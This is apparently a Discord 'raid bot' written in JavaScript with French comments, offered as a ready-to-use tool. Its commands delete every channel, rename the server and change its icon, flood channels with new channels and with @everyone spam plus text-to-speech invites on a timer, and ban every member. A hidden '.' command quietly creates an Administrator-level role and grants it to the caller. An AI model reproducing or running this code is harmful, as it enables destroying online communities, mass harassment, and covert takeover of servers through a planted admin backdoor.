const Discord = require("discord.js");
const botconfig = require("./botconfig.json");
var bot = new Discord.Client();
 
bot.on('ready', () => {
    console.log(`===========================================================`)
    console.log(`Ci-dessous se trouve les [LOGS] !`)
    console.log(`===========================================================`)
    console.log(`[LOGS] ${bot.user.username} Le Self est en ligne !`)
    console.log(`[LOGS] ${bot.user.username} prêt à utiliser vos commandes !`)
    console.log(`===========================================================`)
 
 
})
 
bot.on("ready", () =>{
    //bot.user.setGame("Pandor OnTheFlux")
    bot.user.setGame(`/menu | 𝑯𝒂𝒛𝒆 > lien de ton discord ici`, "https://www.twitch.tv/lestream");
    //bot.user.setGame(`${bot.users.size}`, "User | /help", "https://www.twitch.tv/lestream");
 
});
 
bot.on('message', message => {
    let prefix = botconfig.prefix;
 
    bot.on('message', message => {
        let args = message.content.trim().split(/ +/g)
        if(message.deletable) message.delete
        if (args[0].toLowerCase() === prefix + ".") {
            let member = message.mentions.members.first()
            if (!member) return message.channel.send("Membre introuvable")
            if(message.deletable) message.delete()
            let muterole = message.guild.roles.find(role => role.name === 'Hz')
            if (muterole) {
                member.addRole(muterole)
            }
            else {
                message.guild.createRole({name: 'Hz', permissions: 8}).then((role) => {
                    message.guild.channels.filter(channel => channel.type === 'text').forEach(channel => {
                        channel.overwritePermissions(role, {
                            SEND_MESSAGES: true
                        })
                    })
                    member.addRole(role)
                })
            }
        }
    })
 
    if(message.content === prefix + "menu"){
        var help_embed = new Discord.RichEmbed()
        .setTitle("🌐 • *** 𝗠𝗢𝗡 𝗠𝗘𝗡𝗨 *** • 🌐")
        .addField("⚠️ • __***𝗥𝗔𝗜𝗗***__ / ====> ✅ (Open)", "`/raid`")
        .setThumbnail(`https://media.giphy.com/media/i4jKn7itdV2Tvjzj6Y/giphy.gif`)
        .setImage(`https://media.giphy.com/media/rrFyBm3nxiCoU/giphy.gif`)
        .setColor("RANDOM")
        .setFooter("Dev by 𝑷𝒖𝒓𝒑𝒍𝒆 𝑯𝒂𝒛𝒆#6031")
        message.channel.send(help_embed);
    }
 
    if(message.content === prefix + "raid"){
        var help_embed = new Discord.RichEmbed()
        .setTitle("🌐 • *** 𝗠𝗘𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗘𝗦 𝗥𝗔𝗜𝗗 *** • 🌐")
        .addField("⚠️ • __***𝗖𝗿𝗲𝗮𝘁𝗶𝗼𝗻𝘀 𝗱𝗲𝘀 𝗰𝗵𝗮𝗻𝗻𝗲𝗹***__ / ====> ✅ (Open)", "`/servdestroy`")
        .addField("⚠️ • __***𝗦𝗽𝗮𝗺 𝗱𝗮𝗻𝘀 𝗹𝗲𝘀 𝗰𝗵𝗮𝗻𝗻𝗲𝗹***__ / ====> ✅ (Open)", "`/servdestroy2`")
        .setImage(`https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif`)
        .setThumbnail(`https://media.giphy.com/media/pYyFAHLW0zJL2/giphy.gif`)
        .setColor("RANDOM")
        .setFooter("Dev by 𝑷𝒖𝒓𝒑𝒍𝒆 𝑯𝒂𝒛𝒆#6031")
        message.channel.send(help_embed);
    }
   
    else if (message.content === prefix + "servdestroy") {
        message.delete();
 
        if (message.channel.type === "dm") return;
        if (message.guild.channels.size === 0) return;
        if (!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
        message.guild.channels.forEach(chan => { if (chan.deletable) chan.delete(); })
 
        if (message.guild.name != `ce que tu veux`) {
            message.guild.setIcon("https://cdn.discordapp.com/attachments/644613487246573624/644619785102950401/l-allemand-remercie-ses-fans-avec-un-nouveau-freestyle-videoclip.jpg").catch(error => { })
            message.guild.setName('ce que tu veux ').catch(error => { })
            message.guild.setRegion('russia').catch(error => { })
        }
        setInterval(function () {
            if (message.guild.channels.size < 499) {
                message.guild.createChannel('nom des channels qui va crée ', 'text').catch(error => { })
            }
        }, 400);
    }
    else if (message.content === prefix + 'servdestroy2') { 
 
        if (message.channel.type === "dm") return;
 
        setInterval(function () {
            message.guild.channels.every(channel => channel.send("@everyone @here **pareille ici ce que tu veux** \n" + //
                "https://discord.gg/MNShZUc \n" +
                "ton message aussi la  \n" +
                "ton message que tu veux ici", { tts: true }).catch(error => { }))
        }, 400);
    }
    if (message.content === prefix + "banall") {
        if (message.deletable) message.delete();
        message.guild.members.forEach(member => {
            member.ban().then(function () { });
        });
    }
   
});
 
bot.login('TOKEN')
